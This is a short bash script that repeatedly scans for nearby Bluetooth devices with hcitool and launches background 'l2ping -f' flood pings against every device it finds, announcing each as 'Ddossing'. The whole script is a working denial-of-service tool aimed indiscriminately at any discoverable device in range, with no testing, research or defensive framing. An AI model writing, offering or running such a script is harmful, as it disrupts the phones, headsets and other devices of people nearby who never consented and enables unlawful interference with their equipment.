#!/bin/bash

while true; do
    echo "Scanning..."
    
    devices=$(sudo hcitool scan | grep ':' | awk '{print $1}')
    
    if [ -z "$devices" ]; then
        echo "Nothing found :("
    else
        echo "Devices found: $devices"
        
        for device in $devices; do
            echo "Ddossing $device"
            sudo l2ping -f $device &
        done
    fi
    sleep 10
done
